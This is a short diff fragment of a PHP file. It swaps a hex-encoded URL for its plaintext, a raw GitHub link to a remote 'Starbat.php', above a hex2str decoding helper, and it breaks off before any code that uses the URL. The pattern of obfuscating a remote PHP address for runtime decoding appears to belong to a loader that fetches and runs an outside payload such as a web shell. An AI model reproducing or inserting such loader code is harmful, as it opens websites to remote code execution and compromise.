@@ -1,5 +1,5 @@
 <?php
-$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f73656e746170616269732f4163696d6979656b2f726566732f68656164732f6d61696e2f537461726261742e706870';
+$hexUrl = 'https://raw.githubusercontent.com/sentapabis/Acimiyek/refs/heads/main/Starbat.php';
 
 function hex2str($hex) {
     $str = '';
